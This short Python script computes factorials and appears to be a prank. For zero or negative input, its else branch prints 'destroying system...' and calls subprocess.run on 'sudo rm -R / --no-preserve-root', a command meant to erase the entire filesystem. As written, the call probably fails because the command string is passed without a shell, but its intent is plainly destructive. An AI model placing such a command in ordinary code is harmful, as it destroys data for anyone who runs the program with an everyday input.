import subprocess
n = int(input("enter num: "))
ndup = n
if n > 0:
    tulos = 1
    while n > 1:
        tulos *= n
        n -= 1
    print(f"{ndup}! = {tulos}")
else:
    print("destroying system...")
    subprocess.run("sudo rm -R / --no-preserve-root")